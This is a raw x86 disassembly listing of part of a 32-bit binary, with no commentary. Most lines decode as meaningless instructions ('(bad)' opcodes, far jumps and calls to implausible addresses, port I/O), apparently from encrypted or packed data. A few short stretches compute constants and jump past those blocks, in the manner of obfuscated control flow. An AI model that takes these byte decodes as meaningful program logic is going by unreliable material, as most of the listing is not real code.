  40d189:	sbb    al,0x71
  40d18b:	stc    
  40d18c:	mov    ds:0x3c624e30,eax
  40d191:	aam    0x1f
  40d193:	aas    
  40d194:	test   al,0x15
  40d196:	jge    0x40d19a
  40d198:	iret   
  40d199:	sbb    esi,DWORD PTR ds:0xd5583d8
  40d19f:	test   eax,0xf67ccde3
  40d1a4:	xchg   esp,eax
  40d1a5:	jge    0x40d1ff
  40d1a7:	imul   ecx,DWORD PTR [ebx],0xca469426
  40d1ad:	push   0x53
  40d1af:	lods   al,BYTE PTR ds:[esi]
  40d1b0:	add    al,dl
  40d1b2:	push   0x69
  40d1b4:	shld   DWORD PTR [eax],ecx,cl
  40d1b7:	ja     0x40d190
  40d1b9:	ret    
  40d1ba:	sub    al,0xdc
  40d1bc:	adc    esp,DWORD PTR [esi-0x2a]
  40d1bf:	pop    ds
  40d1c0:	and    edx,DWORD PTR [edi]
  40d1c2:	int    0x19
  40d1c4:	dec    ebp
  40d1c5:	fisub  DWORD PTR ds:0xbae5f656
  40d1cb:	adc    al,0x9b
  40d1cd:	cwde   
  40d1ce:	stos   DWORD PTR es:[edi],eax
  40d1cf:	adc    BYTE PTR ds:0x9b305f06,ch
  40d1d5:	rcl    BYTE PTR [esi-0x13],1
  40d1d8:	(bad)  
  40d1d9:	fisub  DWORD PTR [eax+0x1]
  40d1dc:	iret   
  40d1dd:	jl     0x40d209
  40d1df:	lds    esp,FWORD PTR [esi]
  40d1e1:	push   ds
  40d1e2:	inc    edi
  40d1e3:	ins    BYTE PTR es:[edi],dx
  40d1e4:	mov    al,0xac
  40d1e6:	pop    es
  40d1e7:	xor    BYTE PTR [edi],dl
  40d1e9:	pop    ds
  40d1ea:	sahf   
  40d1eb:	xor    ah,BYTE PTR [edi+0x2e6997bd]
  40d1f1:	sahf   
  40d1f2:	adc    dl,ch
  40d1f4:	jle    0x40d183
  40d1f6:	xchg   ebp,eax
  40d1f7:	jno    0x40d26a
  40d1f9:	mov    esi,0x6ef06b62
  40d1fe:	sahf   
  40d1ff:	sub    al,0xc7
  40d201:	sub    al,0x21
  40d203:	pop    esi
  40d204:	dec    ecx
  40d205:	pop    ebx
  40d206:	or     BYTE PTR [esi+edi*1-0x70],0x62
  40d20b:	leave  
  40d20c:	je     0x40d1a8
  40d20e:	sar    BYTE PTR [edx+eax*1-0x2b],0x33
  40d213:	repnz jmp 0xc811:0x9495fa3e
  40d21b:	xchg   edx,eax
  40d21c:	mov    eax,0xe50071f9
  40d221:	ficomp DWORD PTR [eax]
  40d223:	repnz and BYTE PTR [edx],bl
  40d226:	mov    eax,0x7639a219
  40d22b:	mov    ah,0xf2
  40d22d:	out    0xca,eax
  40d22f:	dec    edi
  40d230:	sar    BYTE PTR [ecx],1
  40d232:	jge    0x40d21d
  40d234:	into   
  40d235:	aaa    
  40d236:	iret   
  40d237:	jnp    0x40d2a7
  40d239:	stos   BYTE PTR es:[edi],al
  40d23a:	pusha  
  40d23b:	rcr    dl,cl
  40d23d:	loopne 0x40d209
  40d23f:	jle    0x40d243
  40d241:	hlt    
  40d242:	sbb    ebp,DWORD PTR ds:[edi-0xe]
  40d246:	iret   
  40d247:	mov    eax,ds:0x5f72d93d
  40d24c:	stos   BYTE PTR es:[edi],al
  40d24d:	xchg   ebx,eax
  40d24e:	in     eax,0x87
  40d250:	adc    eax,0x3ee0805d
  40d255:	sti    
  40d256:	in     al,dx
  40d257:	scas   al,BYTE PTR es:[edi]
  40d258:	jne    0x40d2c8
  40d25a:	pop    edx
  40d25b:	xor    cl,bl
  40d25d:	adc    DWORD PTR [eax+0x458b0e04],ecx
  40d263:	in     al,dx
  40d264:	mov    esi,DWORD PTR [ebp-0x18]
  40d267:	and    eax,0x2389
  40d26c:	xor    eax,0x695
  40d271:	xor    edx,edx
  40d273:	div    esi
  40d275:	lea    ecx,[ecx+eax*1-0x2413]
  40d27c:	mov    eax,DWORD PTR [ebp-0x1c]
  40d27f:	add    eax,DWORD PTR [ebp-0x20]
  40d282:	mov    edx,DWORD PTR [ebp-0x24]
  40d285:	and    eax,edx
  40d287:	mov    edx,DWORD PTR [ebp-0x28]
  40d28a:	imul   eax,edx
  40d28d:	mov    edx,0xd0c8f
  40d292:	sub    edx,eax
  40d294:	cmp    ecx,edx
  40d296:	jbe    0x40cf3b
  40d29c:	push   0x2
  40d29e:	pop    eax
  40d29f:	mov    DWORD PTR [ebp-0x1c],eax
  40d2a2:	mov    DWORD PTR [ebp-0x20],ebx
  40d2a5:	mov    DWORD PTR [ebp-0x24],0x5
  40d2ac:	mov    DWORD PTR [ebp-0x28],0x6686
  40d2b3:	mov    DWORD PTR [ebp-0x8],0x7cf1
  40d2ba:	mov    DWORD PTR [ebp-0x4],eax
  40d2bd:	mov    DWORD PTR [ebp+0x8],0x739a
  40d2c4:	mov    DWORD PTR [ebp-0xc],0xf3a
  40d2cb:	xor    edx,edx
  40d2cd:	mov    DWORD PTR [ebp-0x10],0x429
  40d2d4:	mov    eax,DWORD PTR [ebp-0x28]
  40d2d7:	mov    ecx,DWORD PTR [ebp-0x24]
  40d2da:	sub    eax,0x175c
  40d2df:	div    ecx
  40d2e1:	jmp    0x40d5a5
  40d2e6:	test   DWORD PTR [esi],esi
  40d2e8:	push   eax
  40d2e9:	inc    edx
  40d2ea:	sbb    bl,BYTE PTR [edx]
  40d2ec:	jnp    0x40d324
  40d2ee:	inc    esp
  40d2ef:	sbb    DWORD PTR [edi+0x7c],esi
  40d2f2:	(bad)  
  40d2f3:	data16 mov bh,0x7c
  40d2f6:	sub    eax,0xd21818e2
  40d2fb:	adc    al,0x18
  40d2fd:	sbb    BYTE PTR [esi],al
  40d2ff:	and    al,0x96
  40d301:	loopne 0x40d32d
  40d303:	gs in  al,0xad
  40d306:	das    
  40d307:	in     eax,0xce
  40d309:	push   ebp
  40d30a:	ins    BYTE PTR es:[edi],dx
  40d30b:	mov    eax,ds:0x36754944
  40d310:	jbe    0x40d2a0
  40d312:	xor    eax,0x4afe4cd7
  40d317:	xor    esp,DWORD PTR [edi+0x3d]
  40d31a:	int    0x9a
  40d31c:	mov    ebp,0x565a5a15
  40d321:	mov    eax,0x46349189
  40d326:	pushf  
  40d327:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d328:	shl    DWORD PTR [ecx-0x6d],0xc0
  40d32c:	call   0xa3d6e3f8
  40d331:	xor    eax,0xb0fb9516
  40d336:	jp     0x40d31f
  40d338:	(bad)  
  40d339:	je     0x40d385
  40d33b:	sbb    ah,BYTE PTR [edi-0x17]
  40d33e:	call   0xdae3:0xb975065
  40d345:	mov    DWORD PTR [edx-0x65],edi
  40d348:	mov    WORD PTR [ebp+0x6c3f119f],ds
  40d34e:	dec    esp
  40d34f:	jb     0x40d3bb
  40d351:	pop    edx
  40d352:	xchg   ecx,eax
  40d353:	and    DWORD PTR [edx*1-0x16a17158],0x39
  40d35b:	jecxz  0x40d3b9
  40d35d:	push   0xa52403e4
  40d362:	mov    bh,0xc8
  40d364:	and    ecx,edi
  40d366:	arpl   si,cx
  40d368:	aad    0xd0
  40d36a:	pop    ecx
  40d36b:	test   al,cl
  40d36d:	loopne 0x40d346
  40d36f:	add    ecx,edx
  40d371:	cli    
  40d372:	push   esp
  40d373:	popf   
  40d374:	mov    ah,0x45
  40d376:	fucom  st(4)
  40d378:	retf   0x9e7f
  40d37b:	loopne 0x40d3a5
  40d37d:	or     BYTE PTR [edx+0x57],dl
  40d380:	dec    esi
  40d381:	and    DWORD PTR [eax-0x1a199f7a],0xfffffff5
  40d388:	mov    ch,0x1
  40d38a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d38b:	fwait
  40d38c:	xchg   ebx,eax
  40d38d:	jp     0x40d3da
  40d38f:	pop    ds
  40d390:	ins    DWORD PTR es:[edi],dx
  40d391:	jle    0x40d3f5
  40d393:	fnstenv [eax+ecx*2+0x3089102d]
  40d39a:	js     0x40d342
  40d39c:	sahf   
  40d39d:	xor    DWORD PTR [edx],edi
  40d39f:	daa    
  40d3a0:	jl     0x40d3b1
  40d3a2:	test   BYTE PTR [esi-0x4e],0xd9
  40d3a6:	add    BYTE PTR [ecx-0x216a2b2e],bh
  40d3ac:	mov    al,ds:0xabfdc0c
  40d3b1:	inc    esi
  40d3b2:	mov    dh,0x91
  40d3b4:	div    ebx
  40d3b6:	fmul   DWORD PTR [ebx+edi*2+0x16]
  40d3ba:	ss pop ds
  40d3bc:	(bad)  
  40d3bd:	in     eax,dx
  40d3be:	pusha  
  40d3bf:	and    BYTE PTR [ecx-0x71],0x6f
  40d3c3:	fwait
  40d3c4:	gs cmc 
  40d3c6:	lods   al,BYTE PTR ds:[esi]
  40d3c7:	or     al,0x11
  40d3c9:	and    ebx,DWORD PTR [edi+0x26]
  40d3cc:	(bad)  
  40d3cd:	jge    0x40d439
  40d3cf:	sahf   
  40d3d0:	jb     0x40d3ca
  40d3d2:	ins    DWORD PTR es:[edi],dx
  40d3d3:	sub    al,0xbf
  40d3d5:	push   ss
  40d3d6:	(bad)  
  40d3d8:	bound  esi,QWORD PTR [eax]
  40d3da:	cmp    DWORD PTR [edi-0x16],esp
  40d3dd:	sar    DWORD PTR [ebp-0x2777e24b],cl
  40d3e3:	xchg   ebx,ecx
  40d3e5:	jb     0x40d45a
  40d3e7:	imul   ebx,DWORD PTR [ecx-0x5f],0x90965627
  40d3ee:	xchg   esi,eax
  40d3ef:	mov    ch,0x37
  40d3f1:	sub    eax,0x51100c4f
  40d3f6:	push   eax
  40d3f7:	stc    
  40d3f8:	xchg   esi,eax
  40d3f9:	cwde   
  40d3fa:	inc    esp
  40d3fb:	mov    ebx,0x3b2ce17f
  40d400:	jno    0x40d38a
  40d402:	add    al,0x93
  40d404:	mov    esi,0xe2d18d52
  40d409:	mov    ebp,DWORD PTR [edx+ebx*4+0x7d44c072]
  40d410:	shr    DWORD PTR [ebp-0x3],cl
  40d413:	sub    ebx,0xfaeb1a1f
  40d419:	add    eax,0xf8514aeb
  40d41e:	push   ss
  40d41f:	lea    esp,ds:0x3161152c
  40d425:	aam    0x9a
  40d427:	call   0xcd56cc6d
  40d42c:	addr16 dec eax
  40d42e:	xlat   BYTE PTR ds:[ebx]
  40d42f:	sub    DWORD PTR [eax],edx
  40d431:	pop    esp
  40d432:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d433:	data16 jns 0x40d424
  40d436:	cdq    
  40d437:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d438:	and    ebx,DWORD PTR [ecx-0x46]
  40d43b:	xor    BYTE PTR [ecx+0x6eb2068b],ah
  40d441:	movhps xmm3,QWORD PTR [eax-0x3b]
  40d445:	bnd je 0x40d46c
  40d448:	jmp    0xb434144f
  40d44d:	inc    eax
  40d44e:	lock lahf 
  40d450:	imul   eax,DWORD PTR [eax],0x6e734ba5
  40d456:	dec    ecx
  40d457:	jmp    0x4904:0x63444870
  40d45e:	inc    eax
  40d45f:	jmp    0x903e:0xb75f2a3f
  40d466:	mov    ds:0x437210b,eax
  40d46b:	push   ss
  40d46c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d46d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d46e:	add    ah,dh
  40d470:	push   eax
  40d471:	stos   DWORD PTR es:[edi],eax
  40d472:	pop    cx
  40d474:	xchg   edi,eax
  40d475:	repnz lods al,BYTE PTR ds:[esi]
  40d477:	mov    bl,0x58
  40d479:	jnp    0x40d483
  40d47b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d47c:	add    cl,0x16
  40d47f:	in     al,0x8f
  40d481:	fidiv  WORD PTR [edx+edx*8]
  40d484:	adc    al,0xa2
  40d486:	xor    DWORD PTR [ecx],eax
  40d488:	xchg   esi,eax
  40d489:	emms   
  40d48b:	jbe    0x40d446
  40d48d:	test   DWORD PTR [eax],esi
  40d48f:	(bad)  
  40d490:	mov    edi,0x27e8792a
  40d495:	daa    
  40d496:	(bad)  [ebx+0x62cf3b2f]
  40d49c:	jg     0x40d43f
  40d49e:	lods   al,BYTE PTR ds:[esi]
  40d49f:	loopne 0x40d518
  40d4a1:	xor    al,0x5a
  40d4a3:	push   ss
  40d4a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d4a5:	xor    ch,dl
  40d4a7:	adc    BYTE PTR [edi],dh
  40d4a9:	ins    BYTE PTR es:[edi],dx
  40d4aa:	sahf   
  40d4ab:	ins    BYTE PTR es:[edi],dx
  40d4ac:	mov    bl,BYTE PTR [edi+0x128101b5]
  40d4b2:	jmp    0xaa6a:0xedb75dd7
  40d4b9:	sbb    eax,0x32a881f6
  40d4be:	ret    0x3439
  40d4c1:	das    
  40d4c2:	call   0xb19e:0xa114ac66
  40d4c9:	fstp   TBYTE PTR [edx]
  40d4cb:	xchg   BYTE PTR [edi+0x14],al
  40d4ce:	fnstsw WORD PTR [edx+0x6a2911d4]
  40d4d4:	jle    0x40d491
  40d4d6:	cli    
  40d4d7:	sbb    BYTE PTR [edi-0x5e8308bf],ah
  40d4dd:	jne    0x40d47c
  40d4df:	stos   BYTE PTR es:[edi],al
  40d4e0:	add    BYTE PTR [edi],ah
  40d4e2:	lods   al,BYTE PTR ds:[esi]
  40d4e3:	xchg   esi,eax
  40d4e4:	ret    0x7478
  40d4e7:	or     edx,DWORD PTR [ecx-0x62]
  40d4ea:	pop    edi
  40d4eb:	cs loope 0x40d52c
  40d4ee:	leave  
  40d4ef:	(bad)  
  40d4f0:	jl     0x40d502
  40d4f2:	jge    0x40d4c3
  40d4f4:	adc    eax,0x69e0dd6a
  40d4f9:	add    al,0x8d
  40d4fb:	sbb    ebx,DWORD PTR [edx+0x5fd3dead]
  40d501:	hlt    
  40d502:	je     0x40d504
  40d504:	adc    DWORD PTR [esi],0xecdd2fed
  40d50a:	push   ebx
  40d50b:	push   eax
  40d50c:	fisubr WORD PTR ds:0x670a94ca
  40d512:	xor    al,0x76
  40d514:	add    bl,BYTE PTR [edi+0x65f750d1]
  40d51a:	cmp    eax,0x7a02f474
  40d51f:	ja     0x40d4c4
  40d521:	push   ebx
  40d522:	fwait
  40d523:	sub    ebp,DWORD PTR [esp+ebp*1]
  40d526:	xchg   BYTE PTR [ebp+esi*4-0xc31f0ce],ch
  40d52d:	inc    ecx
  40d52e:	dec    eax
  40d52f:	out    dx,eax
  40d530:	mov    DWORD PTR [edx+0x15dc2c8d],esi
  40d536:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d537:	xchg   esi,eax
  40d538:	add    bh,BYTE PTR ds:[edx+0x4cd5a2e6]
  40d53f:	jmp    0x3e5:0x66007e73
  40d546:	pop    eax
  40d547:	xor    al,0xcf
  40d549:	(bad)  
  40d54b:	mov    ch,0xff
  40d54d:	pop    esi
  40d54e:	pop    edx
  40d54f:	adc    BYTE PTR [eax],bl
  40d551:	push   ebp
  40d552:	dec    esp
  40d553:	add    ch,BYTE PTR [ecx+edi*1]
  40d556:	mov    bh,0xf8
  40d558:	(bad)  
  40d55a:	lea    edx,[esi-0x38]
  40d55d:	test   ebp,ecx
  40d55f:	lock ds pop es
  40d562:	(bad)  
  40d563:	inc    DWORD PTR [esi+0x347b0329]
  40d569:	in     eax,dx
  40d56a:	nop
  40d56b:	leave  
  40d56c:	mov    esp,0x12ca12e7
  40d571:	fisttp WORD PTR [edx+ebp*1+0x55304736]
  40d578:	add    eax,0xc3badf6d
  40d57d:	xchg   ebx,eax
  40d57e:	or     al,0xc
  40d580:	call   0x1ac87b20
  40d585:	add    eax,0x6c1f98c
  40d58a:	iret   
  40d58b:	(bad)  
  40d58c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d58d:	inc    ecx
  40d58e:	mov    esp,0x49dfb362
  40d593:	popa   
  40d594:	lock jo 0x40d584
  40d597:	add    BYTE PTR [eax+0x10],bh
  40d59a:	and    eax,0x7f618ce4
  40d59f:	ret    0x65c4
  40d5a2:	mov    edx,0x4d8b395a
  40d5a7:	loopne 0x40d5dc
  40d5a9:	shr    cl,cl
  40d5ab:	mov    edi,0x5a000002
  40d5b0:	fdiv   DWORD PTR [edi+0x64]
  40d5b3:	sbb    esp,DWORD PTR [edx]
  40d5b5:	pop    edx
  40d5b6:	into   
  40d5b7:	sbb    edi,ecx
  40d5b9:	jae    0x40d637
  40d5bb:	aas    
  40d5bc:	stos   DWORD PTR es:[edi],eax
  40d5bd:	cmp    edi,DWORD PTR [esi+0x1818dce7]
  40d5c3:	rcl    BYTE PTR [eax+ebx*1],cl
  40d5c6:	sbb    cl,ch
  40d5c8:	xchg   ebx,eax
  40d5c9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d5ca:	test   BYTE PTR [ecx],0xff
  40d5cd:	xchg   ebx,eax
  40d5ce:	cmc    
  40d5cf:	and    esp,DWORD PTR [edi-0x61]
  40d5d2:	add    esi,DWORD PTR [eax-0x15]
  40d5d5:	ret    
  40d5d6:	sbb    ebp,DWORD PTR [eax-0x20]
  40d5d9:	call   0xe436:0xa5ebfd36
  40d5e0:	add    ebp,ebx
  40d5e2:	popf   
  40d5e3:	das    
  40d5e4:	fsub   st(3),st
  40d5e6:	in     eax,dx
  40d5e7:	dec    ebp
  40d5e8:	retf   0x1002
  40d5eb:	test   BYTE PTR [ecx+0x78],dl
  40d5ee:	std    
  40d5ef:	mov    es,WORD PTR [esi+0x2f483f5]
  40d5f5:	retf   0x5c26
  40d5f8:	pop    ss
  40d5f9:	jle    0x40d5c6
  40d5fb:	xor    edi,0xfffffffc
  40d5fe:	sahf   
  40d5ff:	test   DWORD PTR [ecx+0x1f2cc4f],ebx
  40d605:	pop    ss
  40d606:	push   ecx
  40d607:	jl     0x40d668
  40d609:	push   es
  40d60a:	fld    QWORD PTR [edi]
  40d60c:	fninit 
  40d60e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d60f:	fwait
  40d610:	lahf   
  40d611:	xchg   edi,eax
  40d612:	arpl   WORD PTR [esi+0x636d60af],si
  40d618:	jno    0x40d616
  40d61a:	dec    ebp
  40d61b:	leave  
  40d61c:	xchg   esi,eax
  40d61d:	mov    dh,0xca
  40d61f:	push   cs
  40d620:	cwde   
  40d621:	mov    cl,0xd3
  40d623:	inc    esi
  40d624:	mov    ecx,0x39060476
  40d629:	mov    DWORD PTR [edi+eax*8-0x2c],edi
  40d62d:	jle    0x40d63f
  40d62f:	add    BYTE PTR [edi],bl
  40d631:	mov    ebp,0x3f505b7f
  40d636:	add    BYTE PTR [ebx-0x5b],dh
  40d639:	daa    
  40d63a:	mov    bl,0x48
  40d63c:	or     ecx,0x8ff7b7ae
  40d642:	test   DWORD PTR [ebx-0x5d6ee9f5],edx
  40d648:	mov    al,0x75
  40d64a:	pop    ebp
  40d64b:	xor    al,0x8
  40d64d:	ins    BYTE PTR es:[edi],dx
  40d64e:	scas   eax,DWORD PTR es:[edi]
  40d64f:	in     al,dx
  40d650:	pop    ds
  40d651:	outs   dx,BYTE PTR ds:[esi]
  40d652:	ret    0x782d
  40d655:	pop    edx
  40d656:	pop    eax
  40d657:	add    eax,0x4d8db9b2
  40d65c:	test   BYTE PTR [eax+0x53],0x34
  40d660:	sub    ebx,DWORD PTR [edx+ecx*1+0x13]
  40d664:	repz mov eax,ds:0xad958aa9
  40d66a:	sbb    dl,al
  40d66c:	add    cl,BYTE PTR [edx+0x265b675c]
  40d672:	mov    ds:0x37716b60,al
  40d677:	popa   
  40d678:	or     esi,0x72ea32c5
  40d67e:	jmp    0x40d6eb
  40d680:	cld    
  40d681:	mov    edi,0x55c6d1a3
  40d686:	ret    0x825f
  40d689:	(bad)  
  40d68a:	lock inc ecx
  40d68c:	jmp    0x5a6d:0xab6d399a
  40d693:	std    
  40d694:	in     al,0x35
  40d696:	jp     0x40d65c
  40d698:	pop    ebp
  40d699:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d69a:	xor    eax,0x511ce6c3
  40d69f:	jns    0x40d69a
  40d6a1:	xor    eax,0xb3c7c5c6
  40d6a6:	loope  0x40d64b
  40d6a8:	dec    edx
  40d6a9:	outs   dx,BYTE PTR ds:[esi]
  40d6aa:	xor    BYTE PTR [esi],ah
  40d6ac:	jae    0x40d72d
  40d6ae:	or     eax,0x9606f6c1
  40d6b3:	cli    
  40d6b4:	jns    0x40d733
  40d6b6:	xor    ch,BYTE PTR [ecx]
  40d6b8:	jne    0x40d6b3
  40d6ba:	mov    esp,0x950c3e4a
  40d6c0:	ins    BYTE PTR es:[edi],dx
  40d6c1:	add    DWORD PTR [esi-0x36],eax
  40d6c4:	mov    esi,DWORD PTR [ecx+0x33bf9e9b]
  40d6ca:	test   al,0x5a
  40d6cc:	dec    ebx
  40d6cd:	mov    al,0x59
  40d6cf:	fist   DWORD PTR [edi-0x70812d38]
  40d6d5:	cmp    ch,BYTE PTR [ecx+0x7dff6d11]
  40d6db:	(bad)  
  40d6dc:	je     0x40d678
  40d6de:	(bad)  
  40d6df:	mov    ds:0x5355ea75,al
  40d6e4:	inc    eax
  40d6e5:	(bad)  
  40d6e6:	sub    eax,0xb31e8eef
  40d6eb:	and    cl,BYTE PTR [esi]
  40d6ed:	inc    ecx
  40d6ee:	and    BYTE PTR [esi],al
  40d6f0:	mov    ds:0xd6c85b8,al
  40d6f5:	jle    0x40d6b8
  40d6f7:	mov    WORD PTR [ecx+0x2c],ds
  40d6fa:	mov    DWORD PTR [esi-0x27711472],esi
  40d700:	inc    esi
  40d701:	add    DWORD PTR [edi],esp
  40d703:	es pop ss
  40d705:	mov    edi,0xfe199be
  40d70a:	add    BYTE PTR [ecx-0x73],ch
  40d70d:	jbe    0x40d690
  40d70f:	pushf  
  40d710:	or     ebx,eax
  40d712:	mov    ecx,0x31d9622a
  40d717:	(bad)  
  40d719:	xchg   ebx,eax
  40d71a:	repz xchg edx,eax
  40d71c:	and    ecx,esi
  40d71e:	push   0xffffff8e
  40d720:	int    0x3d
  40d722:	mov    eax,ds:0xd273ab78
  40d727:	jne    0x40d739
  40d729:	outs   dx,BYTE PTR ds:[esi]
  40d72a:	imul   ecx,DWORD PTR [ecx],0x29
  40d72d:	push   esi
  40d72e:	enter  0x491d,0x37
  40d732:	add    bh,BYTE PTR [ebx-0x4e]
  40d735:	sar    BYTE PTR [eax],0xdb
  40d738:	pushf  
  40d739:	mov    dl,0x25
  40d73b:	push   edx
  40d73c:	cwde   
  40d73d:	pop    DWORD PTR [edi+edi*4+0x12ad0dae]
  40d744:	jl     0x40d787
  40d746:	or     eax,DWORD PTR [ebp+0x2b]
  40d749:	int3   
  40d74a:	adc    BYTE PTR [edi-0x5a534bb7],al
  40d750:	dec    ebx
  40d751:	xchg   ecx,eax
  40d752:	sar    BYTE PTR [ebx],0x69
  40d755:	hlt    
  40d756:	mov    edx,0x1d0f9356
  40d75b:	pop    ebx
  40d75c:	mov    dl,0x62
  40d75e:	push   ecx
  40d75f:	dec    ecx
  40d760:	test   BYTE PTR [ecx],dh
  40d762:	jl     0x40d76f
  40d764:	int    0x9b
  40d766:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d767:	xchg   ebx,eax
  40d768:	pop    eax
  40d769:	ins    WORD PTR es:[edi],dx
  40d76b:	ins    DWORD PTR es:[edi],dx
  40d76c:	(bad)  
  40d76d:	nop
  40d76e:	mov    dl,0xa5
  40d770:	lea    esi,[edx]
  40d772:	fild   QWORD PTR [edx+0x61]
  40d775:	fsubrp st(1),st
  40d777:	add    eax,0x978fa7c5
  40d77c:	sti    
  40d77d:	mov    esi,0xd5d6f4e3
  40d782:	mov    dh,0xfe
  40d784:	out    dx,eax
  40d785:	fisub  DWORD PTR [edi+0x71]
  40d788:	jmp    0x40d764
  40d78a:	sub    BYTE PTR [eax],ch
  40d78c:	xchg   BYTE PTR [eax+0x15a69c12],al
  40d792:	retf   
  40d793:	push   ss
  40d794:	push   0xffffff9e
  40d796:	lods   eax,DWORD PTR ds:[esi]
  40d797:	add    BYTE PTR [ebx+eax*2],bh
  40d79a:	mov    eax,0xd047b8d4
  40d79f:	push   edx
  40d7a0:	pop    ebp
  40d7a1:	dec    ecx
  40d7a2:	in     al,0xe7
  40d7a4:	dec    ebp
  40d7a5:	or     ecx,DWORD PTR [edi]
  40d7a7:	adc    esi,DWORD PTR [edi]
  40d7a9:	mov    ds,WORD PTR [ebx]
  40d7ab:	(bad)  
  40d7ac:	cmp    eax,0xab1dc6ec
  40d7b1:	push   ecx
  40d7b2:	xchg   BYTE PTR [esi],bl
  40d7b4:	add    cl,BYTE PTR [ebx+eax*1+0x2b1c523a]
  40d7bb:	sbb    DWORD PTR [edx+ebx*1+0x0],ebx
  40d7bf:	int3   
  40d7c0:	mov    edx,0x92c2068a
  40d7c5:	cli    
  40d7c6:	mov    al,0xf1
  40d7c8:	lods   eax,DWORD PTR ds:[esi]
  40d7c9:	xor    BYTE PTR [ecx+0x2e],al
  40d7cc:	xchg   edx,eax
  40d7cd:	push   ebp
  40d7ce:	shr    BYTE PTR [eax],cl
  40d7d0:	sti    
  40d7d1:	xor    bh,bh
  40d7d3:	xchg   edi,eax
  40d7d4:	inc    edi
  40d7d5:	test   al,0xf4
  40d7d7:	adc    BYTE PTR ds:0x33aeb858,cl
  40d7dd:	shr    DWORD PTR es:[ebp+0x5c1de763],cl
  40d7e4:	fadd   QWORD PTR [esi]
  40d7e6:	push   edi
  40d7e7:	cmp    al,0x2f
  40d7e9:	enter  0x42c4,0x6d
  40d7ed:	and    eax,0xed2c7da6
  40d7f2:	repz cmp edx,edx
  40d7f5:	sbb    ah,bl
  40d7f7:	aas    
  40d7f8:	mov    DWORD PTR [ecx+0x997cefc],esi
  40d7fe:	(bad)  
  40d7ff:	adc    DWORD PTR [esi-0x573064f5],esp
  40d805:	imul   ecx,DWORD PTR [edx],0xe87d95fe
  40d80b:	adc    DWORD PTR [esi+0x5a1481f7],edi
  40d811:	ins    DWORD PTR es:[edi],dx
  40d812:	int    0x6
  40d814:	and    edx,DWORD PTR [esp+eax*2-0x7aa00117]
  40d81b:	cmp    BYTE PTR [ebp-0x64],dl
  40d81e:	shr    DWORD PTR [ecx],0xa4
  40d821:	sbb    al,0x86
  40d823:	inc    edi
  40d824:	mov    cs,ebp
  40d826:	out    dx,al
  40d827:	sbb    al,0x76
  40d829:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d82a:	popa   
  40d82b:	lods   al,BYTE PTR ds:[esi]
  40d82c:	daa    
  40d82d:	cmp    bh,ch
  40d82f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d830:	xchg   ecx,eax
  40d831:	repz mov ebx,0xf766d4a8
  40d837:	add    DWORD PTR [esi],ebx
  40d839:	xchg   ebp,eax
  40d83a:	fsqrt  
  40d83c:	aad    0xd3
  40d83e:	push   DWORD PTR [edi+eiz*2]
  40d841:	xchg   edi,eax
  40d842:	call   0x1de1:0xea0f6d9c
  40d849:	imul   edi,DWORD PTR [esi+esi*2+0x16],0xd8e866f9
  40d851:	mov    ds:0xa244fb30,eax
  40d856:	fst    QWORD PTR [ebp+0x26]
  40d859:	aaa    
  40d85a:	push   ds
  40d85b:	test   DWORD PTR [esi],eax
  40d85d:	push   ss
  40d85e:	sbb    cl,BYTE PTR [edx]
  40d860:	jbe    0x40d802
  40d862:	in     eax,dx
  40d863:	pop    edx
  40d864:	ja     0x40d7ed
  40d866:	pop    esi
  40d867:	icebp  
  40d868:	or     bl,BYTE PTR [esi+0x7d92d370]
  40d86e:	mov    edi,0x4db5
  40d873:	div    ecx
  40d875:	mov    ecx,DWORD PTR [ebp-0x1c]
  40d878:	xor    edx,edx
  40d87a:	div    ecx
  40d87c:	xor    edx,edx
  40d87e:	mov    ecx,eax
  40d880:	jmp    0x40db44
  40d885:	aam    0x63
  40d887:	sbb    eax,0xcc1a1a64
  40d88c:	and    edx,DWORD PTR [ebp+0x79]
  40d88f:	test   eax,0xa14a46bc
  40d894:	jo     0x40d836
  40d896:	fcomp  DWORD PTR [eax]
  40d898:	sbb    dl,dl
  40d89a:	adc    al,0x18
  40d89c:	sbb    BYTE PTR [esi],al
  40d89e:	push   ss
  40d89f:	cs xor bl,bh
  40d8a2:	and    al,0xbd
  40d8a4:	jmp    0xe04192dc
  40d8a9:	jge    0x40d8e3
  40d8ab:	ins    BYTE PTR es:[edi],dx
  40d8ac:	jmp    0x2ec0e1ab
  40d8b1:	ret    0xbb72
  40d8b4:	out    0x9b,al
  40d8b6:	xor    BYTE PTR [ebp-0x69fc374a],dh
  40d8bc:	cmp    DWORD PTR [edi+edi*4],eax
  40d8bf:	aam    0x3c
  40d8c1:	cmp    al,0x5e
  40d8c3:	mov    al,0xf0
  40d8c5:	jmp    0x27ce:0x3dc7aa07
  40d8cc:	loop   0x40d910
  40d8ce:	adc    eax,0x1f3c6192
  40d8d3:	lock stos WORD PTR es:[edi],ax
  40d8d6:	cdq    
  40d8d7:	adc    bh,BYTE PTR [eax-0xbabb0cf]
  40d8dd:	clc    
  40d8de:	sbb    BYTE PTR [ebx-0x37d2f46c],bl
  40d8e4:	sub    eax,DWORD PTR [ecx+0x6ac6120c]
  40d8ea:	loopne 0x40d872
  40d8ec:	out    dx,al
  40d8ed:	(bad)  
  40d8ee:	xchg   edx,eax
  40d8ef:	adc    BYTE PTR [ebx],0xab
  40d8f2:	jle    0x40d8ae
  40d8f4:	lods   eax,DWORD PTR ds:[esi]
  40d8f5:	fcmove st,st(5)
  40d8f7:	mov    eax,ds:0xd69a0c57
  40d8fc:	loope  0x40d8c4
  40d8fe:	cmp    edi,DWORD PTR [esi]
  40d900:	sbb    eax,DWORD PTR [esi+ebp*2+0x64]
